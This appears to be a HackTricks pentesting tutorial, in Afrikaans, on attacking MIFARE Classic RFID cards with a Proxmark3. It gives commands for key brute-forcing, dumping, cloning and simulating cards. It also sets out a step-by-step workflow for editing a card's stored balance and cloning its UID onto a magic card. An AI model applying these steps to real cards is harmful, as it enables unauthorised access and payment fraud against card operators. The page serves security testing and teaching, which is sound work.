# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Aanvalle op RFID-stelsels met Proxmark3

Die eerste ding wat jy moet doen, is om 'n [**Proxmark3**](https://proxmark.com) te hê en die [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux) te installeer.

### Aanval op MIFARE Classic 1KB

Dit het **16 sektore**, elkeen daarvan het **4 blokke** en elke blok bevat **16B**. Die UID is in sektor 0 blok 0 (en kan nie verander word nie).\
Om toegang tot elke sektor te verkry het jy **2 sleutels** (**A** en **B**) nodig wat gestoor word in **blok 3 van elke sektor** (sector trailer). Die sector trailer stoor ook die **access bits** wat die **lees en skryf** toestemmings op **elke blok** gee met behulp van die 2 sleutels.\
2 sleutels is nuttig om toestemming te gee om te lees as jy die eerste ken en om te skryf as jy die tweede ken (byvoorbeeld).

Verskeie aanvalle kan uitgevoer word
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Die Proxmark3 maak dit moontlik om ander aksies uit te voer, soos **eavesdropping** op 'n **Tag to Reader communication**, om te probeer sensitiewe data te vind. Op hierdie kaart kan jy net die kommunikasie sniff en die gebruikte sleutel bereken, omdat die **kriptografiese operasies wat gebruik word swak is**, en deur die onversleutelde en versleutelde teks te ken, kan jy dit bereken (`mfkey64` tool).

#### MiFare Classic vinnige werkvloei vir misbruik van gestoorwaarde

Wanneer terminals balanse op Classic-kaarte stoor, is 'n tipiese end-to-end-vloei:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Aantekeninge

- `hf mf autopwn` orkestreer nested/darkside/HardNested-styl aanvalle, herwin sleutels, en skep dumps in die kliënt se dumps-lêergids.
- `Writing block 0/UID` werk slegs op magic gen1a/gen2-kaarte. Normale Classic-kaarte het 'n read-only UID.
- Baie implementasies gebruik Classic "value blocks" of eenvoudige checksums. Maak seker dat alle gedupliseerde/aanvulde velde en checksums na die redigering konsekwent is.

Sien 'n hoërvlak metodologie en mitigasies in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Ruwe Opdragte

IoT-stelsels gebruik soms **nie-merkgebonde of nie-kommersiële tags**. In daardie geval kan jy Proxmark3 gebruik om pasgemaakte **ruwe opdragte aan die tags te stuur**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Met hierdie inligting kan jy probeer om inligting oor die kaart en oor die manier om daarmee te kommunikeer te soek. Proxmark3 laat toe om raw commands te stuur soos: `hf 14a raw -p -b 7 26`

### Scripts

Die Proxmark3-sagteware kom met 'n voorafgelaaide lys van **automation scripts** wat jy kan gebruik om eenvoudige take uit te voer. Om die volledige lys te kry, gebruik die `script list` command. Daarna gebruik die `script run` command, gevolg deur die naam van die script:
```
proxmark3> script run mfkeys
```
Jy kan 'n skrip skep om **fuzz tag readers** — deur die data van 'n **valid card** te kopieer, skryf jy 'n **Lua script** wat een of meer willekeurige **bytes** **randomize** en kontroleer of die **reader crashes** by enige iterasie.

## References

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
